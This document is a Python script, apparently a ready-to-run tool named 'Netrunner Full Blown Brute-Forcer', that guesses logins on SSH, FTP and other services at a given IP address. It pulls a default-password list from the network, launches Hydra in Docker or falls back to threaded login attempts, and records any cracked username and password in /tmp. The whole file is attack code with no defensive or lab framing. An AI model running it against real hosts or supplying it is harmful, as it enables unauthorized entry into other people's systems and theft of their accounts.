#!/usr/bin/env python3
import sys
import argparse
import socket
import time
import json
import urllib.request
import concurrent.futures
from pathlib import Path

# Small fallback dictionary if download fails
FALLBACK_CREDENTIALS = [
    ("root", "root"), ("admin", "admin"), ("pi", "raspberry"), ("admin", "1234")
]

DICT_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/default-passwords.txt"
WORDLIST_FILE = "/tmp/netrunner-wordlist.txt"

def log_result(target, service, success, username=None, password=None, error=None):
    log_file = Path("/tmp/netrunner-bruteforce.jsonl")
    result = {
        "timestamp": time.time(),
        "target": target,
        "service": service,
        "success": success
    }
    if success:
        result["username"] = username
        result["password"] = password
    if error:
        result["error"] = error
        
    result_str = json.dumps(result)
    with open(log_file, "a") as f:
        f.write(result_str + "\n")
    print(result_str)

def check_ssh(target, username, password):
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(target, port=22, username=username, password=password, timeout=3, banner_timeout=3)
            return True
        except Exception:
            return False
        finally:
            client.close()
    except ImportError:
        return False

def check_ftp(target, username, password):
    import ftplib
    try:
        ftp = ftplib.FTP()
        ftp.connect(target, 21, timeout=3)
        ftp.login(username, password)
        ftp.quit()
        return True
    except Exception:
        return False

def check_creds(target, service, username, password):
    if service == "ssh":
        return check_ssh(target, username, password)
    else:
        return check_ftp(target, username, password)

def load_wordlist(custom_wordlist=None):
    creds = []
    try:
        if custom_wordlist and Path(custom_wordlist).exists():
            wordlist_path = custom_wordlist
        else:
            if not Path(WORDLIST_FILE).exists():
                urllib.request.urlretrieve(DICT_URL, WORDLIST_FILE)
            wordlist_path = WORDLIST_FILE
            
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                if line.startswith("#") or not line.strip(): continue
                parts = line.strip().split(",")
                if len(parts) >= 2:
                    creds.append((parts[0], parts[1]))
    except Exception as e:
        creds = FALLBACK_CREDENTIALS
    
    if not creds:
        creds = FALLBACK_CREDENTIALS
    return creds

def has_docker():
    import subprocess
    try:
        subprocess.run(["docker", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return True
    except:
        return False

def run_hydra_attack(target, service, credentials):
    import subprocess
    import tempfile
    import re
    
    # Write credentials to temp files so we can mount them to docker
    with tempfile.NamedTemporaryFile("w", delete=False) as f_users, \
         tempfile.NamedTemporaryFile("w", delete=False) as f_pass:
        users = set(u for u, p in credentials)
        for u in users: f_users.write(u + "\n")
        passwords = set(p for u, p in credentials)
        for p in passwords: f_pass.write(p + "\n")
        user_file = f_users.name
        pass_file = f_pass.name

    log_result(target, service, False, error=f"[HYDRA] Launching Dockerized Hydra attack with {len(credentials)} combinations")
    
    cmd = [
        "docker", "run", "--rm", 
        "-v", f"{user_file}:/tmp/users.txt",
        "-v", f"{pass_file}:/tmp/pass.txt",
        "secsi/hydra",
        "-L", "/tmp/users.txt",
        "-P", "/tmp/pass.txt",
        "-f", "-t", "4",
        "-V",
        f"{service}://{target}"
    ]
    
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        attempt_count = 0
        total_tries = len(credentials)
        
        import sys, json
        for line in iter(proc.stdout.readline, ''):
            if "[ATTEMPT]" in line:
                attempt_count += 1
                if attempt_count == 1 or attempt_count % 10 == 0 or attempt_count == total_tries:
                    if total_tries == 0: total_tries = attempt_count * 10
                    print(f"[PROGRESS] {attempt_count}/{total_tries}")
                    sys.stdout.flush()
            
            match = re.search(r"login:\s+(\S+)\s+password:\s+(\S+)", line)
            if match:
                u, p = match.groups()
                log_result(target, service, True, u, p)
                proc.terminate()
                return True

        log_result(target, service, False, error="Dictionary exhausted without success")
        return False
    except Exception as e:
        log_result(target, service, False, error=f"Hydra execution failed: {e}")
        return False

def run_hydra_algo_attack(target, service, username, charset, min_len, max_len):
    import subprocess
    import re
    
    log_result(target, service, False, error=f"[HYDRA] Launching Algorithmic attack (user: {username}, chars: {charset}, len: {min_len}-{max_len})")
    
    cmd = [
        "docker", "run", "--rm", "-t",
        "secsi/hydra",
        "-l", username,
        "-x", f"{min_len}:{max_len}:{charset}",
        "-f", "-t", "4",
        "-V",
        f"{service}://{target}"
    ]
    
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        attempt_count = 0
        total_tries = 0
        
        import sys, json
        for line in iter(proc.stdout.readline, ''):
            if "login tries" in line:
                m = re.search(r'(\d+)\s+login tries', line)
                if m: total_tries = int(m.group(1))
            
            if "[ATTEMPT]" in line:
                attempt_count += 1
                if attempt_count == 1 or attempt_count % 10 == 0 or attempt_count == total_tries:
                    if total_tries == 0: total_tries = attempt_count * 10 # Fallback
                    print(f"[PROGRESS] {attempt_count}/{total_tries}")
                    sys.stdout.flush()
            
            match = re.search(r"login:\s+(\S+)\s+password:\s+(\S+)", line)
            if match:
                u, p = match.groups()
                log_result(target, service, True, u, p)
                proc.terminate()
                return True

        log_result(target, service, False, error="Algorithmic generation exhausted without success")
        return False
    except Exception as e:
        log_result(target, service, False, error=f"Hydra execution failed: {e}")
        return False

def run_python_algo_attack(target, service, username, charset, min_len, max_len, threads=5):
    import itertools
    import concurrent.futures
    import sys
    
    log_result(target, service, False, error=f"[PYTHON] Launching Algorithmic attack (user: {username}, chars: {charset}, len: {min_len}-{max_len})")
    
    chars = ""
    if "a" in charset: chars += "abcdefghijklmnopqrstuvwxyz"
    if "A" in charset: chars += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    if "1" in charset: chars += "0123456789"
    if not chars: chars = charset
    
    total_tries = sum(len(chars)**i for i in range(min_len, max_len + 1))
    success_found = False
    attempt_count = 0
    
    def password_generator():
        for length in range(min_len, max_len + 1):
            for p in itertools.product(chars, repeat=length):
                yield "".join(p)
                
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        # Submit in batches to avoid high memory usage for large algo spaces
        # But for simplicity and to match the other fallback, we'll just iterate 
        # and submit up to a queue limit, or use a simpler approach.
        # Actually, using a queue and worker threads is better for memory.
        import threading
        import queue
        
        pwd_queue = queue.Queue(maxsize=threads * 2)
        
        def worker():
            nonlocal attempt_count, success_found
            while True:
                try:
                    pwd = pwd_queue.get(timeout=1)
                except queue.Empty:
                    break
                    
                if success_found:
                    pwd_queue.task_done()
                    continue
                    
                attempt_count += 1
                if attempt_count == 1 or attempt_count % 10 == 0 or attempt_count == total_tries:
                    print(f"[PROGRESS] {attempt_count}/{total_tries}")
                    sys.stdout.flush()
                    
                if check_creds(target, service, username, pwd):
                    log_result(target, service, True, username, pwd)
                    success_found = True
                    
                pwd_queue.task_done()

        workers = []
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            workers.append(t)
            
        for pwd in password_generator():
            if success_found:
                break
            pwd_queue.put(pwd)
            
        # Empty remaining items if we broke early so join() doesn't hang
        while not pwd_queue.empty():
            try:
                pwd_queue.get_nowait()
                pwd_queue.task_done()
            except queue.Empty:
                break

        pwd_queue.join()
        
    if not success_found:
        log_result(target, service, False, error="Algorithmic exhausted without success")
    return success_found


def main():
    parser = argparse.ArgumentParser(description="Netrunner Full Blown Brute-Forcer")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--service", required=True, choices=["ssh", "ftp", "mysql", "postgres", "redis", "rdp"], help="Service to attack")
    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads")
    parser.add_argument("--wordlist", type=str, help="Path to a custom wordlist file")
    
    # Algorithmic arguments
    parser.add_argument("--algo", action="store_true", help="Enable algorithmic (exhaustive) brute force")
    parser.add_argument("--algo-user", type=str, default="root", help="Username to target in algorithmic mode")
    parser.add_argument("--algo-charset", type=str, default="aA1", help="Hydra charset string (e.g. aA1)")
    parser.add_argument("--algo-min", type=int, default=1, help="Minimum length")
    parser.add_argument("--algo-max", type=int, default=4, help="Maximum length")
    
    args = parser.parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    # Mapping default ports
    port_map = {"ssh": 22, "ftp": 21, "mysql": 3306, "postgres": 5432, "redis": 6379, "rdp": 3389}
    port = port_map.get(args.service, 22)
    
    if sock.connect_ex((args.target, port)) != 0:
        log_result(args.target, args.service, False, error=f"Port {port} is closed or filtered")
        return
    sock.close()

    if args.algo:
        if not has_docker():
            run_python_algo_attack(args.target, args.service, args.algo_user, args.algo_charset, args.algo_min, args.algo_max, args.threads)
            return
        run_hydra_algo_attack(args.target, args.service, args.algo_user, args.algo_charset, args.algo_min, args.algo_max)
        return

    credentials = load_wordlist(args.wordlist)

    # Determine if we should use Docker/Hydra
    if has_docker() and args.service in ["ssh", "ftp", "mysql", "postgres", "redis", "rdp"]:
        run_hydra_attack(args.target, args.service, credentials)
        return

    log_result(args.target, args.service, False, error=f"Starting Python fallback attack with {len(credentials)} combinations")

    # Use ThreadPoolExecutor for rapid brute-forcing
    success_found = False
    attempt_count = 0
    total_tries = len(credentials)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_creds = {executor.submit(check_creds, args.target, args.service, u, p): (u, p) for u, p in credentials}
        
        for future in concurrent.futures.as_completed(future_to_creds):
            if success_found:
                continue # We already found it, let the other threads die
                
            attempt_count += 1
            if attempt_count % 10 == 0 or attempt_count == total_tries:
                print(f"[PROGRESS] {attempt_count}/{total_tries}")
                sys.stdout.flush()
                
            u, p = future_to_creds[future]
            try:
                is_success = future.result()
                if is_success:
                    success_found = True
                    log_result(args.target, args.service, True, u, p)
                    break
            except Exception:
                pass
                
    if not success_found:
        log_result(args.target, args.service, False, error="Dictionary exhausted without success")

if __name__ == "__main__":
    main()
